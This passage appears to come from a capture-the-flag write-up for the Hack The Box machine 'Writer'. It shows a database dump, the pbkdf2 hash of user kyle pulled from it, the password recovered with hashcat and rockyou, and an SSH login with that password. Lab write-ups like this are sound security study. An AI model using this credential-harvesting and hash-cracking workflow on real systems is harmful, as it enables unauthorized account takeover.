Use the low priv shell to dump the SQL db, then grep for some keywords and find a hash for user kyle
```sql
cat dump.out| grep -i kyle
INSERT INTO `auth_user` VALUES (1,'pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=',NULL,1,'kyle','','','kyle@writer.htb',1,1,'2021-05-19 12:41:37.168368');
```
Run the hash through hashcat with rockyou to get kyle's password:```marcoantonio```
```bash
ssh kyle@10.10.11.101
kyle@10.10.11.101's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

[snip]

You have new mail.
Last login: Wed Sep  1 17:29:08 2021 from 10.10.16.2
```